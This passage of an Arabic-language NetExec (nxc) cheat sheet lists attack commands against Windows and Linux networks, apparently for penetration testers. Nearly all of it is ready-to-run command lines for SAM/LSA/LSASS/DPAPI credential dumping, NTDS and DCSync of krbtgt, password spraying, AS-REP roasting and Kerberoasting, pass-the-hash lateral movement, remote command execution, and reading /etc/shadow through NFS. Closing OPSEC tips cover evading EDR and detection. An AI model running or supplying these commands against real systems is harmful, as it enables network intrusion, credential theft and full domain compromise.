nxc mssql <ip> -u user -p pass -M link_enable_cmdshell -o LINKED_SERVER=BRAAVOS ACTION=disable
```

> **💡 Linked Servers:** ممكن تنتقل من دومين لآخر عبر MSSQL — classic path في بيئات enterprise. استخدم `enum_links` أولاً.

### نقل الملفات عبر MSSQL
```bash
nxc mssql <ip> -u user -p pass --put-file /local/file.txt 'C:\\Windows\\Temp\\file.txt'
nxc mssql <ip> -u user -p pass --get-file 'C:\\Windows\\Temp\\file.txt' /local/output.txt
```

---

## 🖥️ WinRM

```bash
# Authentication
nxc winrm <ip> -u user -p pass
nxc winrm <ip> -u user -p pass -d DOMAIN   # SMB port closed

# Command Execution
nxc winrm <ip> -u user -p pass -X 'whoami'       # PowerShell
nxc winrm <ip> -u user -p pass -x 'whoami'       # CMD

# Credential Dumping
nxc winrm <ip> -u user -p pass --sam
nxc winrm <ip> -u user -p pass --lsa
nxc winrm <ip> -u user -p pass --dpapi            # بدون admin!

# LAPS
nxc winrm <ip> -u user-can-read-laps -p pass --laps
nxc winrm <ip> -u user-can-read-laps -p pass --laps AdminName

# Dump method
nxc winrm <ip> -u user -p pass --sam --dump-method cmd
nxc winrm <ip> -u user -p pass --sam --dump-method powershell
```

> **💡 `--dpapi` عبر WinRM:** لا تحتاج صلاحيات admin! لو المستخدم عنده WinRM access يقدر يقرأ DPAPI secrets الخاصة بحسابه.

---

## 🖱️ RDP

```bash
# فحص وـ Spray
nxc rdp <ip> -u user -p pass
nxc rdp 192.168.1.0/24 -u users.txt -p passwords.txt

# Screenshot
nxc rdp <ip> --nla-screenshot            # Screenshot صفحة الـ login (NLA disabled)
nxc rdp <ip> -u user -p pass --screenshot --screentime 5

# Command Execution (إضافة 2025)
nxc rdp <ip> -u user -p pass -x 'whoami'
nxc rdp <ip> -u user -p pass -x 'whoami' --cmd-delay 2 --clipboard-delay 2  # للأجهزة البطيئة
```

> **💡 `--nla-screenshot`:** لو NLA معطّل، تقدر تشوف شاشة الـ login بدون credentials — يكشف الـ username الحالي ومعلومات النظام.

---

## 🌐 WMI

```bash
# Authentication + Command Execution
nxc wmi <ip> -u user -p pass -x 'whoami'
nxc wmi <ip> -u user -p pass --local-auth -x 'ipconfig'

# استعلامات WMI
nxc wmi <ip> -u user -p pass --wmi 'SELECT * FROM Win32_Process'
nxc wmi <ip> -u user -p pass --wmi 'SELECT * FROM Win32_UserAccount'
nxc wmi <ip> -u user -p pass --wmi 'SELECT * FROM Win32_Service'
nxc wmi <ip> -u user -p pass --wmi 'SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True'
nxc wmi <ip> -u user -p pass --wmi 'SELECT * FROM Win32_LoggedOnUser'

# Namespace مخصص
nxc wmi <ip> -u user -p pass --wmi 'SELECT * FROM AntiVirusProduct' --wmi-namespace root\\Microsoft\\Windows\\SecurityCenter2

# طريقة التنفيذ
nxc wmi <ip> -u user -p pass -x 'whoami' --exec-method wmiexec-event  # أهدأ لكن أقل استقراراً
```

---

## 🐧 NFS

```bash
nxc nfs <ip>                                # فحص + NFS versions + root escape check
nxc nfs <ip> --shares                       # العشر المتاحة
nxc nfs <ip> --ls '/'                       # قائمة ملفات
nxc nfs <ip> --share '/var/nfs/data' --ls '/'  # على share معين
nxc nfs <ip> --enum-shares                  # recursive enumeration بعمق 3
nxc nfs <ip> --enum-shares 5               # تغيير عمق الـ recursion

# تحميل/رفع ملفات
nxc nfs <ip> --share '/export/share' --get-file file.txt ./file.txt
nxc nfs <ip> --share '/export/share' --put-file local.txt remote.txt
nxc nfs <ip> --get-file /etc/shadow shadow.txt  # Root escape إذا متاح
```

> **💡 Root Escape في NFS:** إذا الـ share ما عنده `subtree_check` في `/etc/exports`، تقدر تصل لكل الـ filesystem حتى `/etc/shadow`!  
> إذا `no_root_squash` موجود كمان، تقدر تقرأ ملفات الـ root.

---

## 🔌 FTP

```bash
nxc ftp <ip> -u 'anonymous' -p '' --ls     # Anonymous
nxc ftp <ip> -u user -p pass --ls
nxc ftp <ip> -u user -p pass --ls '/path'
nxc ftp <ip> -u user -p pass --get file.txt
nxc ftp <ip> -u user -p pass --put local.txt remote.txt
```

---

## 💻 SSH

```bash
nxc ssh <ip> -u user -p pass
nxc ssh <ip> -u user -p '' --key-file ~/.ssh/id_rsa    # Private key
nxc ssh <ip> -u user -p 'keypassphrase' --key-file key.pem  # Encrypted key
nxc ssh <ip> -u user -p pass -x 'whoami'
nxc ssh <ip> -u user -p pass --put-file local.txt /tmp/remote.txt
nxc ssh <ip> -u user -p pass --get-file /tmp/remote.txt local.txt
nxc ssh <ip> -u user -p pass --sudo-check             # فحص sudo access
nxc ssh <ip> -u user -p pass --sudo-check --sudo-check-method mkfifo
nxc ssh 192.168.1.0/24 --port 2222 -u user -p pass    # Port مخصص
```

---

## 🖥️ VNC

```bash
nxc vnc <ip> -u '' -p 'vncpassword'        # VNC لا يحتاج username
nxc vnc <ip> --port 5901 -u '' -p pass    # Port مخصص
nxc vnc <ip>                               # فحص (No Auth إذا موجود يظهر تلقائياً)
nxc rdp <ip> -u user -p pass --screenshot --screentime 5   # Screenshot عبر RDP
```

---

## 🗂️ قاعدة البيانات الداخلية — nxcdb

```bash
nxcdb                              # تشغيل الـ interactive shell
nxcdb (default) > proto smb        # الدخول لقاعدة بيانات SMB
nxcdb (default)(smb) > creds       # عرض الـ credentials المحفوظة
nxcdb (default)(smb) > hosts       # عرض الـ hosts
nxcdb (default)(smb) > shares      # عرض الـ shares
nxcdb (default) > workspace create pentest1   # workspace جديد
nxcdb (default) > workspace list
nxcdb (default) > workspace pentest1
nxcdb (pentest1)(smb) > export creds detailed creds.csv   # export بيانات
nxcdb (pentest1)(smb) > export hosts simple hosts.csv
```

> **💡 الفائدة:** nxc يحفظ تلقائياً كل credentials ناجحة في قاعدة البيانات. تقدر تستخدمها لاحقاً بـ `-id <cred_id>` بدل كتابة user/pass في كل مرة.

```bash
# استخدام credentials من قاعدة البيانات
nxc smb <ip> -id 1
nxc smb <ip> -id 1 2 3   # أكثر من credential
```

---

## ⚙️ الإعدادات المتقدمة — nxc.conf

```ini
# الملف: ~/.nxc/nxc.conf

[nxc]
log_mode = True            # log كل شيء تلقائياً
audit_mode = *             # يخفي الـ credentials من output
ignore_opsec = False       # لا تتجاهل تحذيرات الـ OPSEC
check_guest_account = true # فحص تلقائي لـ guest login

[BloodHound]
bh_enabled = True
bh_uri = 127.0.0.1
bh_port = 7687
bh_user = neo4j
bh_pass = yourpassword
```

> **💡 BloodHound Integration:** عند تفعيله، كل account ناجح في nxc يُعلّم تلقائياً كـ "owned" في BloodHound.

---

## 🧰 خيارات عامة مفيدة

```bash
# Output & Logging
nxc smb <ip> -u user -p pass --log results.txt
nxc smb <ip> -u user -p pass --verbose
nxc smb <ip> -u user -p pass --debug

# Performance
nxc smb <ip> -u user -p pass -t 50          # عدد الـ threads (default: 256)
nxc smb <ip> -u user -p pass --timeout 10   # timeout بالثواني

# DNS
nxc smb <ip> -u user -p pass --dns-server 192.168.1.1
nxc smb <ip> -u user -p pass --dns-timeout 5
nxc smb <ip> -u user -p pass --dns-tcp
nxc smb <ip> -u user -p pass -6             # Force IPv6

# Special chars في الـ password
nxc smb <ip> -u user -p 'P@ss!word'        # Wrap بـ single quotes
nxc smb <ip> -u='-user' -p='-P@ss'         # لو بتبدأ بـ dash

# Modules
nxc smb -L                                  # قائمة كل الـ modules
nxc smb -M lsassy --options                 # خيارات module معين
nxc smb <ip> -u user -p pass -M mod1 -M mod2 -M mod3  # أكثر من module مرة وحدة
```

---

## 🔑 توليد TGT وملف Kerberos

```bash
# توليد TGT وحفظه
nxc smb <ip> -u user -p pass --generate-tgt /tmp/user.ccache
export KRB5CCNAME=/tmp/user.ccache
nxc smb <ip> --use-kcache

# توليد krb5.conf (لتجنب DNS issues)
nxc smb <ip> -u user -p pass --generate-krb5-file /tmp/krb5.conf
export KRB5_CONFIG=/tmp/krb5.conf

# توليد hosts file
nxc smb 192.168.1.0/24 --generate-hosts-file /tmp/hosts.txt
sudo tee -a /etc/hosts < /tmp/hosts.txt
```

---

## 📊 ملخص الـ Protocols والـ Ports

| Protocol | Port | متى تستخدمه؟ |
|----------|------|--------------|
| `smb` | 445 | الأساس — enum, exec, dump في بيئات Windows |
| `ldap` | 389/636 | AD queries, Kerberos attacks, BloodHound |
| `winrm` | 5985/5986 | Remote PS، evil-winrm بديل |
| `mssql` | 1433 | Database attacks, xp_cmdshell |
| `rdp` | 3389 | GUI access, screenshot, spray |
| `wmi` | 135 | Remote queries وأوامر |
| `ssh` | 22 | Linux targets |
| `ftp` | 21 | File shares قديمة |
| `nfs` | 2049 | Linux file shares |
| `vnc` | 5900 | Remote desktop بدون Windows auth |

---

## 🎯 سيناريوهات هجومية شائعة

### سيناريو 1: Black-Box — بدون credentials
```bash
# 1. رسم خريطة الشبكة
nxc smb 192.168.1.0/24 --generate-hosts-file /tmp/hosts.txt
sudo tee -a /etc/hosts < /tmp/hosts.txt

# 2. فحص Null/Guest sessions
nxc smb 192.168.1.0/24 -u '' -p '' --pass-pol
nxc smb 192.168.1.0/24 -u '' -p '' --users
nxc smb 192.168.1.0/24 -u 'guest' -p '' --shares

# 3. Kerbrute / ASREPRoast بدون credentials
nxc ldap <DC-IP> -u users.txt -p '' --asreproast asrep.txt
hashcat -m18200 asrep.txt /usr/share/wordlists/rockyou.txt

# 4. GPP passwords
nxc smb <DC-IP> -u '' -p '' -M gpp_password

# 5. أجهزة بدون SMB signing (للـ relay)
nxc smb 192.168.1.0/24 --gen-relay-list relay.txt
```

### سيناريو 2: Grey-Box — بعد الحصول على credentials
```bash
# 1. Password spray على كل الشبكة
nxc smb 192.168.1.0/24 -u user -p pass --continue-on-success

# 2. BloodHound collection
nxc ldap <DC-IP> -u user -p pass --bloodhound --collection DCOnly --dns-server <DC-IP>

# 3. LDAP enum أساسي
nxc ldap <DC-IP> -u user -p pass --admin-count
nxc ldap <DC-IP> -u user -p pass --find-delegation
nxc ldap <DC-IP> -u user -p pass --trusted-for-delegation
nxc ldap <DC-IP> -u user -p pass -M get-desc-users
nxc ldap <DC-IP> -u user -p pass --kerberoasting kerb.txt
nxc ldap <DC-IP> -u user -p pass --asreproast asrep.txt

# 4. فحص Shares
nxc smb 192.168.1.0/24 -u user -p pass --shares --filter-shares READ
nxc smb 192.168.1.0/24 -u user -p pass -M spider_plus -o DOWNLOAD_FLAG=True

# 5. فحص MSSQL
nxc mssql 192.168.1.0/24 -u user -p pass
```

### سيناريو 3: Admin على جهاز — Post-Exploitation
```bash
# 1. Dump credentials
nxc smb <ip> -u admin -p pass --sam
nxc smb <ip> -u admin -p pass --lsa
nxc smb <ip> -u admin -p pass -M lsassy
nxc smb <ip> -u admin -p pass --dpapi nosystem

# 2. بحث عن كلمات سر مخزّنة
nxc smb <ip> -u admin -p pass -M winscp
nxc smb <ip> -u admin -p pass -M mremoteng
nxc smb <ip> -u admin -p pass -M putty
nxc smb <ip> -u admin -p pass -M powershell_history
nxc smb <ip> -u admin -p pass -M eventlog_creds

# 3. Lateral movement
nxc smb 192.168.1.0/24 -u admin -H '<dumped_hash>' --continue-on-success
nxc smb 192.168.1.0/24 -u admin -H '<hash>' -x 'whoami'
```

### سيناريو 4: Domain Admin — إنهاء المهمة
```bash
# 1. NTDS dump
nxc smb <DC-IP> -u domadmin -p pass --ntds
nxc smb <DC-IP> -u domadmin -p pass --ntds --enabled

# 2. DCSync على مستخدم معين
nxc smb <DC-IP> -u domadmin -p pass --ntds --user krbtgt
nxc smb <DC-IP> -u domadmin -p pass --ntds --user Administrator

# 3. Golden Ticket (بعد الحصول على krbtgt hash)
# استخدم impacket ticketer.py مع krbtgt hash

# 4. Spray الـ hashes على كل الشبكة
nxc smb 192.168.1.0/24 -u Administrator -H '<admin_hash>' --local-auth --continue-on-success
```

---

> **📝 ملاحظات OPSEC مهمة:**
> - `wmiexec` أهدأ من `smbexec` (لا ينشئ services)
> - `--dpapi nosystem` يتجنب لمس الـ SYSTEM credentials التي تراقبها الـ EDR
> - `--jitter` ضروري في بيئات الـ production لتفادي الـ detection
> - `audit_mode` في الـ config يمنع ظهور الـ passwords في الـ terminal logs
> - `nxcdb` مع workspaces ينظّم العمل بين engagement وآخر
